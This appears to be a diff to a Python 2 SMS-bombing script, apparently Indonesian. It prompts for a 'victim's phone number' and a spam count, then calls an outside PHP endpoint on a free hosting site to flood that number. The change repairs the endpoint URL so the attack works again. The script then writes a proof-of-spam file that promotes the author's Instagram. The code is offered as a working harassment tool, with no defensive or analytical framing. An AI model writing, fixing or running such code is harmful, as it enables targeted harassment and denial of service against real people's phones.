@@ -31,7 +31,7 @@ def rog():
         nomor = raw_input('\033[32;1m[✓]\033[37;1m Masukan Nomor Hp Korban\033[35;1m =>\033[32;1m ')
         jumlh = raw_input('\033[32;1m[✓]\033[37;1m Masukan Jumlah Spam \033[35;1m =>\033[32;1m ')
         tik()
-        urllib2.urlopen('https://webmegk.000webhostapp.com/sms.php/sms.php?nomor=' + nomor + '&paket=' + jumlh)
+        urllib2.urlopen('https://webmegk.000webhostapp.com/sms.php?nomor=' + nomor + '&paket=' + jumlh)
         cek = open('bukti.txt','w')
         cek.write('Spam Sudah Dikirim Ke Target Follow Instagram wisnu_as123\n\n')
         cek.write('Nomor Hp Korban : '+nomor)
